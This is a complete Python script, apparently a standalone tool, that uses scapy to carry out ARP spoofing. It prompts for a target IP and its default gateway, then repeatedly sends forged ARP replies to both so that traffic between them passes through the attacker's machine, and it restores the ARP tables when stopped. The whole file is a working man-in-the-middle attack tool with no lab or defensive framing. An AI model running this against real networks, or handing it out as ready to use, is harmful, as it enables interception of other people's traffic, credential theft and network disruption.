#!/usr/bin/python3

from colorama import Fore
from colorama import Style

import scapy.all as scapy
import time
import re

# IP address validation using regex
def validate_ip(ip):
    return re.match(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', ip) is not None

# Get the MAC address corresponding to a given IP address using ARP requests
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"\nNo response received for ARP request to {ip}.")
        return None

# Send spoofed ARP packets to the target
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

# Restore ARP tables by sending legitimate ARP packets
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.sendp(packet, verbose=False)

def main():
    print(f"{Fore.RED}***ARP Spoofer***{Style.RESET_ALL}")
    target_ip = input("Enter the target's IP address >>\t")
    target_default_gateway = input("Enter the target's default gateway IP address >>\t")
    if not (validate_ip(target_ip) and validate_ip(target_default_gateway)):
        print("Invalid IP address format. Exiting.")
        return
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, target_default_gateway)
            spoof(target_default_gateway, target_ip)
            sent_packets_count += 2
            print(f"\r[*] {sent_packets_count} packets were sent", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        restore(target_default_gateway, target_ip)
        restore(target_ip, target_default_gateway)
        print("\n[*] ARP Spoof Stopped")
    except Exception as e:
        restore(target_default_gateway, target_ip)
        restore(target_ip, target_default_gateway)
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()